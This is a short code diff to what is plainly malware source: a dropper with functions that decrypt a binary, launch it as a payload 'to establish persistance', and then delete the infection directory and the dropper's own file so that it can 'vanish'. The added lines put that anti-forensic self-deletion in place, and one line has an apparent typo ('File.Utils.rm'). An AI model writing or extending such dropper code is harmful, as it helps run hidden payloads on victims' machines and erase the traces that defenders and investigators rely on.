@@ -113,16 +113,20 @@ def decrypt_binary()
 end
 
 def execute_payload()
-	# establish persistance and execute
+	# Establish persistance and execute
 	Process.new("./" + DECRYPTED_BINARY_NAME)
+	# Should find way to ensure process has launched, then clean up.
 end
 
 def seppuku()
-	# delete dropper
+	# Delete infection root and dropper binary (self).
+	FileUtils.rm_r(DIRECTORY_NAME)
+	File.Utils.rm(File.real_path(PROGRAM_NAME))
 end
 
 def clean_up_dropper()
 	# Job's done. Clean up traces of dropper and vanish.
+	FileUtils.rm(File.real_path(PROGRAM_NAME))
 end
 
 
